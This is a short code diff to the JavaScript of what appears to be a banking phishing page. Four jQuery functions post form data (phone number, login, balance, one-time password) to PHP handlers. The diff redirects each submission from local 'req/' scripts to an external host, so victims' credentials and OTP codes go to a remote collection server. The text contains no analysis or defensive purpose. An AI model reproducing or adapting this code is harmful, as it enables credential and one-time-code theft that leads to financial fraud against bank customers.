@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'req/no.php',
+        url: 'https://koyebapps.wellxx.sbs/dbes/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'req/login.php',
+        url: 'https://koyebapps.wellxx.sbs/dbes/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'req/saldo.php',
+        url: 'https://koyebapps.wellxx.sbs/dbes/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'req/otp.php',
+        url: 'https://koyebapps.wellxx.sbs/dbes/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
